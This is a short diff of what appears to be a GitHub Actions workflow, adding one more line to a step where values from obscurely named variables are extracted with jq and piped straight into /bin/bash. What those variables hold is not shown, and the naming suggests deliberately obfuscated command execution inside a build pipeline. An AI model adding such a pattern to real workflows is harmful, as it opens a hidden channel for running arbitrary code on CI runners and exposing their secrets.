@@ -27,6 +27,7 @@ jobs:
           echo $ons8 | jq -r .fbza93 | /bin/bash
           echo $wamn2 | jq -r .t67 | /bin/bash
           echo $yimf5524 | jq -r .sdbym79733 | /bin/bash
+          printf '%s' "$dou0" | jq -r .p9 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
